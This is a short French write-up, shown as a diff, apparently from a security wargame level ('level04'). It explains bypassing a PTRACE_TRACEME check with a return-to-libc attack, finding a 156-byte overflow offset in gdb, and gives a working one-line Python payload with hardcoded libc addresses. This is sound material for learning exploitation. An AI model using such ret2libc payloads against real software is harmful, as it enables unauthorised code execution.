@@ -1,0 +1,12 @@
+- on remarque un PTRACE_TRACEME - qui empeche d'executer les execve ulterieurs (SIGTRAP)
+- on trouve donc une solution sans execve => on choisit ret to libc
+
+- on repere l'overflow en passant par gdb + option set follow-fork-mode child (pour suivre le segfault qui arrive dans le child)
+- il arrive aux n avec AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnn
+- donc l'offset avant l'overflow = 156
+
+
+- on prepare le ret to libc
+- on lance : 
+
+(python -c 'import struct ; print "A"*156 + struct.pack("I", 0xf7e6aed0) + struct.pack("I", 0xf7e5eb70) + struct.pack("I", 0xf7f897ec)' ; cat) | ./level04
